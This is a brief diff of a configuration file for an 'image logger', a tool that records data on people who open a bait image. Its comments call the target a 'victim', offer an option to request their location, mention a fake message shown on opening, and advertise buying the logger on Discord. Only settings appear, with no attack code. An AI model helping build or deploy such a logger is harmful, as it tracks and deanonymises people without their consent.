@@ -18,7 +18,7 @@ config = {
     
     "accurateLocation": False, # Asks victim for permissions to acces their location.
 
-    "message": Oops image failed to load { # Show a custom message when the user opens the image
+    "message": { # Show a custom message when the user opens the image
         "doMessage": False, # Enable the custom message? tu se mozesz dac co chcesz sory ze po angielsku ale amerykana sprzedaje tego loggera XD ale masz opisane ustawienia
         "message": "add @zjya on discord if u wanna buy the image logger", # Message to show
         "richMessage": False, # Enable rich text?
